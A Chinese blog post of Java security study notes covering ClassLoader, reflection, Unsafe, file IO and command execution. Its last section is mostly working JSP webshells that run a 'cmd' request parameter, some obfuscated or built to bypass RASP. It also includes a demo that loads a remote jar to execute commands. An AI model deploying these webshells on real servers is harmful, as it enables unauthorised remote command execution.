---
title: Java Security Study Notes (Basic)
tags:
  - Java
  - Summary
date: 2021-02-08 19:49:07
---

## 0x01 ClassLoader

`ClassLoader` 是 Java 运行时环境 JRE 的一部分，用于动态加载 Class 到 JVM 内存空间，Java 源代码(`.java`) 经 `javac` 编译后生成类文件(`.class`)，再由 JVM 来解析执行类文件字节码(`ByteCode`)。

![](/assets/images/move/2021-02-08-20-09-51.png)

### ClassLoader 类型

JVM ClassLoader 子系统根据类的类型及路径来决定加载该类的 ClassLoader，ClassLoader 有三种默认类型：

1. `BootStrap ClassLoader` 引导类加载器：Bootstrap 类加载器是一种机器代码，当 JVM 调用它时会启动该操作。它不是一个 Java 类，其工作为加载第一个纯 Java ClassLoader，从 **jre/lib/rt.jar** 加载类。BootStrap ClassLoader 没有任何父 ClassLoader，也被成为 Primodial ClassLoader 原始类加载器.

2. `Extension ClassLoader` 拓展类加载器：Extension ClassLoader 是 BootStrap ClassLoader 的子加载器，从相应的 JDK 扩展库加载 Java 核心类的扩展，从 **jre/lib/ext** 目录或系统属性 **java.ext.dirs** 指向的任何其他目录。

3. `System ClassLoader` 系统类加载器： Application ClassLoader 应用程序类加载器也称为系统类加载器，加载环境变量(**CLASSPATH, -classpath / -cp**)中的应用程序类型类，是 Extension ClassLoader 的子类。

### ClassLoader 委派机制

功能性原则是 Java ClassLoader 所依据的一组规则或特性，其三个原则分别为：

1\. `Delegation Model` 委托模型：Java 虚拟机和 Java 类加载器使用称为**委托层次算法**(Delegation Hierarchy Algorithm) 的算法将类加载到 Java 文件中。ClassLoader 基于委托模型提供的一组操作进行工作：

- ClassLoader 始终遵循委托层次结构原则。

- 每当 JVM 遇到一个类时，它都会检查该类是否已加载。如果该类已经在方法区域中加载，则 JVM 继续执行；如果该类不在方法区域中，则 JVM 要求 Java ClassLoader 子系统加载该特定类，然后 ClassLoader 子系统将控件移交给 Application ClassLoader。

- Application ClassLoader 将请求委托给 Extension ClassLoader，然后依次将请求委托给 Bootstrap ClassLoader。

- Bootstrap ClassLoader 将在 Bootstrap 类路径(jre/lib/rt.jar)中搜索。如果该类可用，则将其加载，否则将请求委托给 Extension ClassLoader。

- Extension ClassLoader 在扩展类路径(jre/lib/ext、java.ext.dirs)中搜索类。如果该类可用，则将其加载，否则将请求委托给 Application ClassLoader。

- Application ClassLoader 在应用程序类路径(CLASSPATH, -classpath / -cp)中搜索类。如果该类可用，则将其加载，否则，将抛出 **ClassNotFoundException** 异常。

ClassLoader **双亲委派机制**始终按照 Application ClassLoader -> Extension ClassLoader -> Bootstrap ClassLoader 顺序，BootStrap ClassLoader 优先级最高，以此类推。当 ClassLoader 接收到类加载请求时，首先将任务委托给其父类加载器来加载，如果父类加载器无法完成该请求，将由子类加载器来进行加载。双亲委派机制使得类有了层次划分，防止重复加载类以及保证核心类不被篡改。

![](/assets/images/move/2021-02-08-20-38-51.png)

2\. `Visibility Principle` 可见性原则：父 ClassLoader 加载的类对子 ClassLoader 可见，但子 ClassLoader 加载的类对父 ClassLoader 不可见。


3\. `Uniqueness Property` 唯一性：类是唯一的，没有重复的类，确保由父类加载器加载的类不会由子类加载器加载，如果父类加载器无法找到该类，则由当前实例自行尝试。

### Java.lang.ClassLoader 方法

在 JVM 请求该类之后，将遵循一些步骤以加载一个类。按照委托模型加载类，其中有一些重要的方法或函数在加载类中起着至关重要的作用。

1. `loadClass(String name, boolean resolve)`: 用于加载 JVM 引用的类，如果 resolve 参数为 true，那么还需要调用 resolveClass 方法链接类,默认为 false。

2. `defineClass(byte[] b, int off, int len)`: `final` 方法，不能被覆盖，用于将字节数组定义为 class 的实例。如果该类无效，则抛出 **ClassFormatError**。

3. `findClass(String name)`: 用于查找指定的类，该方法只会查找但不会加载该类。

4. `findLoadedClass(String name)`: 用于验证 JVM 引用的 Class 是否先前已加载。 

5. `Class.forName(String name, boolean initialize, ClassLoader loader)`: 用于加载类和初始化类，此方法还提供选择任何一个 ClassLoader 的选项。如果 ClassLoader 参数为 NULL，则使用 Bootstrap ClassLoader。

6. `resolveClass()`: 链接特定的 Java 类。

在加载类之前，将执行以下代码：

```java
protected synchronized Class<?> 
  loadClass(String name, boolean resolve) 
    throws ClassNotFoundException 
{ 
    Class c = findLoadedClass(name); 
    try { 
        if (c == NULL) { 
            if (parent != NULL) { 
                c = parent.loadClass(name, false); 
            } 
            else { 
                c = findBootstrapClass0(name); 
            } 
        } 
        catch (ClassNotFoundException e) 
        { 
            System.out.println(e); 
        } 
    } 
} 
```

如果一个类已经被加载，则返回该类，否则将对新类的搜索委托给父类加载器。如果父类加载器找不到该类，**loadClass()** 调用 **findClass()** 来查找类进行加载。**findClass()** 中如果父 ClassLoader 未找到该类，则在当前 ClassLoader 中搜索该类。

### 自定义类加载器

**java.lang.ClassLoader** 是所有的类加载器的父类，用于加载 jar 包的 **java.net.URLClassLoader** 通过继承 **java.lang.ClassLoader** 类，重写了 **findClass()** 从而实现了加载目录class 文件及远程资源文件的功能。**loadClass()** 调用 **findClass()** 来查找类进行加载，可以通过重载 `findClass()` 来自定义类加载器。

测试：

TestClass.java:

```java
package com.ins.z;

public class TestClass {
    public String hello() {
        return "hello world!!!";
    }
}
```

ReadByteCode.java:

```java
package com.ins.z;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Arrays;

public class ReadByteCode {
    public static void main(String[] args) {
        BufferedInputStream bfs = null;
        byte[] buffer = new byte[10240];
        try {
            bfs = new BufferedInputStream(new FileInputStream(args[0]));
            int bfsRead = bfs.read(buffer);
            System.out.println("classFile: " + args[0]);
            System.out.println("bfsRead: " + bfsRead);
            System.out.println(Arrays.toString(Arrays.copyOfRange(buffer, 0, bfsRead)).replace("[","").replace("]",""));
        } catch (FileNotFoundException ex) {
            ex.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        } finally {
            try {
                if (bfs != null) bfs.close();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}
```

TestClassLoader.java:

```java
package com.ins.z.classloader;

import java.lang.reflect.Method;

public class TestClassLoader extends ClassLoader {
    // class name
    private static String testClassName = "com.ins.z.TestClass";
    // ByteCode
    private static byte[] testClassByteCode = new byte[]{
        -54, -2, -70, -66, 0, 0, 0, 52, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 14, 84, 101, 115, 116, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 14, 104, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33, 33, 33, 1, 0, 19, 99, 111, 109, 47, 105, 110, 115, 47, 122, 47, 84, 101, 115, 116, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12
    };

    @Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // Only TestClass
        if (name.equals(testClassName)) {
            // call JVM native method to define TestClass
            return defineClass(testClassName, testClassByteCode, 0, testClassByteCode.length);
        }
        return super.findClass(name);
    }

    public static void main(String[] args) {
        // create a custom ClassLoader
        TestClassLoader loader = new TestClassLoader();

        try {
            // loadClass TestClass
            Class testClass = loader.loadClass(testClassName);

            // Reflect testClass, equals to testClass t = new testClass();
            Object testInstance = testClass.newInstance();

            // Reflect hello method
            Method method = testInstance.getClass().getMethod("hello");

            // Reflect call hello method, equals to String str = t.hello();
            String str = (String) method.invoke(testInstance);

            System.out.println(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

运行结果：

![](/assets/images/move/2021-02-09-18-34-10.png)

> 利用自定义类加载器我们可以在 Webshell 中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的 native 方法绕过 RASP 检测，也可以用于加密重要的 Java 类字节码(只能算弱加密了)。

### URLClassLoader

`URLClassLoader` 用于从指向 JAR 文件和目录的 URL 路径加载类和资源，提供了远程加载资源的能力，可用于远程加载 JAR 包来实现远程的类方法调用。

CMD.java（编译得到 CMD.class，生成 JAR 包，远程部署到 VPS 上）:

```java
package com.ins.z.none;

import java.io.IOException;

public class CMD {
    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }
}
```

TestURLClassLoader.java

```java
package com.ins.z;

import java.net.URL;
import java.net.URLClassLoader;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;

public class TestURLClassLoader {
    public static void main(String[] args) {
        try {
            // Define remote jar url
            URL url = new URL("http://IP:9876/jar_file/cmdx.jar");
            // Create URLClassLoader Object to remote loading jar
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});
            // Command to Execute
            String cmd = "id";
            // load class CMD for the jar & jar file require Main-Class in MANIFEST.MF; jar cvf cmdx.jar *
            Class cmdClass = ucl.loadClass("com.ins.z.none.CMD");
            // call Method exec in CMD =>  Process process = CMD.exec("id && ls"); 
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
            // Get the input stream of the command execution result
            InputStream           in   = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;
            // Red command execute result
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }
            System.out.println(baos.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](/assets/images/move/2021-02-10-19-06-02.png)


## 0x02 Reflection

Java Reflection 是 Java 非常重要的动态特性，通过反射我们可以动态地获取和修改类(class)、接口(interface)、字段(field)和方法(method)，以及实例化新对象、调用任意类方法和获取/修改类成员变量值等，利用反射机制可以轻松的实现 Java 类的动态调用。

### java.lang.Class

Java Reflection 操作的是 `java.lang.Class` 对象，获取 Class 对象的方法有：

1. 类名.class => com.ins.z.TestClass.class

2. Class.forName("com.ins.z.TestClass")

3. ClassLoader.loadClass("com.ins.z.TestClass")

在获取数组类型的 Class 对象时需使用 Java 类型的描述符方式：

```java
Class<?> doubleArray = Class.forName("[D"); // => double[].class
Class<?> cStringArray = Class.forName("[[Ljava.lang.String;");// => String[][].class
```

### java.lang.Runtime

获取 Runtime 类 Class 对象：

```java
String className = "java.lang.Runtime";
Class rc1 = Class.forName(className);
Class rc2 = java.lang.Runtime.class;
Class rc3 = ClassLoader.getSystemClassLoader().loadClass(className);
```

反射调用内部类的时候需要使用 `$` 来代替 `.`，com.ins.z.Test.Inter => com.ins.z.Test$Inter。


在 Java 中任何一个类都有至少一个构造方法，如果代码中未创建构造方法，则在类编译时自动创建一个无参的构造方法(private)，通过反射可以获取到 Runtime 的私有构造方法并修改访问权限，从而创建 Runtime 实例，调用 exec 方法来执行本地命令:

```java
// System.out.println(IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream(), "UTF-8"));
Class rc = Class.forName("java.lang.Runtime");
Constructor c = rc.getDeclaredConstructor(); // Private
c.setAccessible(true); // Modify access permissions!
Object ro = c.newInstance();
Method rm = rc.getMethod("exec", String.class);
Process p = (Process) rm.invoke(ro, cmd);
InputStream in = p.getInputStream();
System.out.println(IOUtils.toString(in, "UTF-8"));
```

### getDeclaredMethods()

Class 对象提供了一个获取某个类的全部成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法。

```java
// All
Method[] methods = clazz.getDeclaredMethods();
// Special
Method method = clazz.getDeclaredMethod("方法名");
Method method = clazz.getDeclaredMethod("方法名", 参数类型如 String.class，多个参数用","号隔开);
```

> `getMethod` 和 `getDeclaredMethod` 都能够获取到类成员方法，区别在于 getMethod 只能获取到当前类和父类的所有有权限的方法(如：public)，而 `getDeclaredMethod` 能获取到当前类的所有成员方法(不包含父类)。

**反射调用方法**：获取到 java.lang.reflect.Method 对象后可通过 Method 的 `invoke` 方法来调用类方法。

```java
method.invoke(方法实例对象, 方法参数值，多个参数值用","隔开);
```

- method.invoke 的第一个参数必须是**类实例对象**，如果调用的是 static 方法那么第一个参数值可以传 null，因为在 java 中调用静态方法是不需要有类实例的，因为可以直接**类名.方法名(参数)**的方式调用。

- method.invoke 的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的依次传入对应的参数类型。

### getDeclaredFields()

Java 反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。

```java
// All
Field fields = clazz.getDeclaredFields();
// Special
Field field  = clazz.getDeclaredField("变量名");
// Get Value
Object obj = field.get(类实例对象);
// Set Value
field.set(类实例对象, 修改后的值);
// Modify access permissions! 
field.setAccessible(true);
// 修改 final 关键字修饰的成员变量
// 反射获取 Field 类的 modifiers
Field modifiers = field.getClass().getDeclaredField("modifiers");
// 设置modifiers修改权限
modifiers.setAccessible(true);
// 修改成员变量的Field对象的modifiers值
modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
// 修改成员变量值
field.set(类实例对象, 修改后的值);
```

## 0x03 Unsafe

`sun.misc.Unsafe` 是 Java 底层 API 提供的一个神奇的 Java 类（仅限 Java 内部使用，外部只能通过反射调用），提供了一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升 Java 运行效率、增强 Java 语言底层资源操作能力方面起到了很大的作用。

![](/assets/images/move/2021-02-11-14-38-16.png)

```java
// Reflect -> Field
Field f = Unsafe.class.getDeclaredField("theUnsafe");
f.setAccessible(true); // private static final Unsafe theUnsafe;
Unsafe unsafe = (Unsafe) f.get(null);
// Reflect -> Class Instance
Constructor constructor = Unsafe.class.getDeclaredConstructor();
constructor.setAccessible(true);
Unsafe unsafe = (Unsafe) constructor.newInstance();
```

### allocateInstance()

Unsafe 中提供 `allocateInstance` 方法，**仅通过 Class 对象就可以（无视构造方法）创建此类的实例对象，而且不需要调用其构造函数、初始化代码、JVM 安全检查等**。假设 RASP hook 了构造函数，可以利用 Unsafe 类来创建实例绕过，它抑制修饰符检测，也就是即使构造器是 **private** 修饰的也能通过此方法实例化，只需提类对象即可创建相应的对象。由于这种特性，allocateInstance 在 java.lang.invoke、Objenesis（提供绕过类构造器的对象生成方式）、Gson（反序列化时用到）中都有相应的应用。

```java
HookedCls hc = (HookedCls) unsafe.allocateInstance(Hookcls.class);
```

### defineClass()

Unsafe 提供了一个通过传入类名、类字节码的方式就可以**直接调用 JVM 创建类对象**的 defineClass 方法:

```java
public native Class defineClass(String var1, byte[] var2, int var3, int var4);
public native Class<?> defineClass(String var1, byte[] var2, int var3, int var4, ClassLoader var5, ProtectionDomain var6);
```

在 ClassLoader 被限制的情况下可以通过 Unsafe 的 defineClass 来注册类:

```java
Class cls = unsafe.defineClass(CLASS_NAME, CLASS_BYTES, 0, CLASS_BYTES.length);
```

调用需要传入的类加载器和保护域的方法：

```java
// 获取系统的类加载器
ClassLoader clsLoader = ClassLoader.getSystemClassLoader();
// 创建默认的保护域
ProtectionDomain domain = new ProtectionDomain(
    new CodeSource(null, (Certificate[]) null), null, clsLoader, null
);
// 使用 Unsafe 向 JVM 中注册目标类
Class cls = unsafe.defineClass(
    CLASS_NAME, CLASS_BYTES, 0, CLASS_BYTES.length, clsLoader, domain
);
```

Unsafe 还可以通过 `defineAnonymousClass` 方法创建内部类。

```java
public native Class<?> defineAnonymousClass(Class<?> hostClass, byte[] data, Object[] cpPatches);
```

> Java 8 中需要调用传加载器和保护域的方法。Java 11 开始 Unsafe 类把 defineClass 移除了（defineAnonymousClass 方法还在），虽然可以通过 java.lang.invoke.MethodHandlers.Lookup.defineClass 代替，但实际 MethodHandlers 间接调用了 ClassLoader 的 defineClass.

## 0x04 IO / NIO

Java SE 中内置了两类文件系统：`java.io`（阻塞） 和 `java.nio`（JDK7+，非阻塞），java.nio 的实现是 sun.nio，文件系统底层的 API 实现如下图：

![](/assets/images/move/2021-02-12-10-20-22.png)


合理的利用 NIO 文件系统特性可用于绕过某些只是防御了 `java.io.FileSystem` 的 WAF/RASP。

### FileIn/OutputStream


FileInputStreamDemo.java:

```java
package com.ins.z.io;

import java.io.*;

public class FileInputStreamDemo {
    public static void main(String[] args) throws IOException {
        File file = new File("/etc/hosts"); // File Object
        FileInputStream fis = new FileInputStream(file); // Open File Object, create InputSteam
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        int r = 0;
        byte[] buffer = new byte[1024];
        while( (r = fis.read(buffer)) != -1) {
            out.write(buffer, 0, r);
        }
        System.out.println(out.toString());
    }
}
```

FileOutputStream.java:

```java
package com.ins.z.io;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class FileOutputStreamDemo {
    public static void main(String[] args) throws IOException {
        File file = new File("/tmp/tmp.txt");
        String content = "Hello world!";
        FileOutputStream fos = new FileOutputStream(file);
        fos.write(content.getBytes());
        fos.flush();
        fos.close();
    }
}
```

### RandomAccessFile

```java
package com.ins.z.io;

import java.io.*;

public class RandomAccessFileDemo {
    public static void main(String[] args) {
        // read
        File file = new File("/etc/hosts");
        try {
            RandomAccessFile raf = new RandomAccessFile(file, "r"); // r rw rws rwd
            int a = 0;
            byte[] buffer = new byte[1024];
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            while( (a = raf.read(buffer)) != -1) {
                out.write(buffer, 0, a);
            }
            System.out.println(out.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
        // write
        File file2 = new File("/tmp/tmp.txt");
        String content = "hello world";
        try {
            RandomAccessFile raf2 = new RandomAccessFile(file2, "rw");
            raf2.write(content.getBytes());
            raf2.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

### FileSystemProvider

通过 JDK7 新增的 NIO.2 的 **java.nio.file.spi.FileSystemProvider**，我们可以以支持异步的通道(Channel)模式读取文件内容。

```java
package com.ins.z.io;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class FileSystemProviderDemo {
    public static void main(String[] args) {
        // READ
        // Path path = (new File("/etc/hosts")).toPath();
        Path path = Paths.get("/etc/hosts");
        try {
            /* java.nio.file.Files 是 JDK7 开始提供的一个对文件读写取非常便捷的 API
            其底层是调用了 java.nio.file.spi.FileSystemProvider 来实现对文件的读写*/
            byte[] bytes = Files.readAllBytes(path);
            System.out.println(new String(bytes));
        } catch (IOException e) {
            e.printStackTrace();
        }
        // WRITE
        Path path2 = Paths.get("/tmp/tmp.txt");
        String content = "hello world @";
        try {
            Files.write(path2, content.getBytes());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

## 0x05 命令执行

### Runtime

每个 Java 应用程序都有一个 Runtime 类实例，该实例允许该应用程序与运行该应用程序的环境进行交互，当前运行时可以从 `getRuntime()` 方法获得。

一句话小马：

```java
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
```

获取回显：

```java
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
    InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();

    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;

    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }

    out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
%>
```

反射执行：

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Scanner" %>s
<%
    String cmd = request.getParameter("cmd");

    // java.lang.Runtime
    String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101});

    // Reflect java.lang.Runtime class
    Class<?> c = Class.forName(rt);

    // Reflect Runtime getRuntime() method
    Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101}));

    // Reflect Runtime exec() method
    Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);

    // Reflect call Runtime.getRuntime().exec(xxx) method
    Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{cmd});

    // Reflect Process getInputStream() method
    Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
    m.setAccessible(true);

    // exec result => InputStream Object, getInputStream() & Scanner Split by line
    Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter("\\A");
    String result = s.hasNext() ? s.next() : "";

    out.println(result);
%>
```

Runtime.exec() 调用堆栈大致如下，exec() 并不是命令执行的终点：

```java
java.lang.UNIXProcess.<init>
java.lang.ProcessImpl.start
java.lang.ProcessBuilder.start
java.lang.Runtime.exec
```

### ProcessBuilder

ProcessBuilder 类用于创建操作系统进程。

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
    InputStream in = new ProcessBuilder(request.getParameterValues("cmd")).start().getInputStream();
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;

    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }

    out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
%>
```

### ProcessImpl

Java 在 [JDK9](https://hg.openjdk.java.net/jdk-updates/jdk9u/jdk/rev/98eb910c9a97) 中将 UNIXProcess 合并到 ProcessImpl 中，简化了 UnixProcess 实现的源文件。

ProcessBuilder.start() 和 Runtime.exec() 创建一个本地进程，并返回 Process 子类的实例，该实例可用于控制该进程并获取有关它的信息。UNIXProcess 和 ProcessImpl 其实就是最终调用 native 执行系统命令的类，这个类提供了一个叫 forkAndExec 的 native 方法，如方法名所述主要是通过 fork&exec 来执行本地系统命令，该类不能直接调用（构造器 private），可以通过反射 ProcessImpl 的 forkAndExec 方法来绕过 RASP 进行命令执行。

通过获取构造器，设置访问权限，创建实例来执行 fork&exec：

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>

<%!
    byte[] toCString(String s) {
        if (s == null) {
            return null;
        }

        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    InputStream start(String[] strs) throws Exception {
        // java.lang.UNIXProcess
        String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115});
        // java.lang.ProcessImpl
        String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108});
        Class clazz = null;
        // Reflecr UNIXProcess / ProcessImpl class
        try {
            clazz = Class.forName(unixClass);
        } catch (ClassNotFoundException e) {
            clazz = Class.forName(processClass);
        }
        // Reflect UNIXProcess / ProcessImpl constructor
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        assert strs != null && strs.length > 0;

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];

        int size = args.length; // For added NUL bytes
        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc    = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};

        FileInputStream  f0 = null;
        FileOutputStream f1 = null;
        FileOutputStream f2 = null;

        // In theory, close() can throw IOException
        // (although it is rather unlikely to happen here)
        try {
            if (f0 != null) f0.close();
        } finally {
            try {
                if (f1 != null) f1.close();
            } finally {
                if (f2 != null) f2.close();
            }
        }

        // Create UNIXProcess / ProcessImpl intsance
        Object object = constructor.newInstance(
                toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        );

        // Get InputStream
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);

        return (InputStream) inMethod.invoke(object);
    }

    String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }
%>
<%
    String[] str = request.getParameterValues("cmd");

    if (str != null) {
        InputStream in     = start(str);
        String      result = inputStreamToString(in, "UTF-8");
        out.println("<pre>");
        out.println(result);
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>
```

如果 RASP 拦截了 UNIXProcess/ProcessImpl 的构造方法，我们还可以通过：

1. sun.misc.Unsafe.allocateInstance(Class) 无视构造器方法创建类实例。

2. 反射 forkAndExec() 方法，构建相应参数并调用。

3. 反射 initStreams() 方法初始化输入输出结果流对象。

4. 反射 getInputStream() 获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.Unsafe" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%!
    byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }


%>
<%
    String[] strs = request.getParameterValues("cmd");

    if (strs != null) {
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class processClass = null;

        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }

        Object processObject = unsafe.allocateInstance(processClass);

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc                 = new int[1];
        int[] std_fds              = new int[]{-1, -1, -1};
        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
        Field helperpathField      = processClass.getDeclaredField("helperpath");
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        });

        forkMethod.setAccessible(true);// 设置访问权限

        int pid = (int) forkMethod.invoke(processObject, new Object[]{
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        });

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = processClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int                   a    = 0;
        byte[]                b    = new byte[1024];

        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }

        out.println("<pre>");
        out.println(baos.toString());
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>
```

### JNI

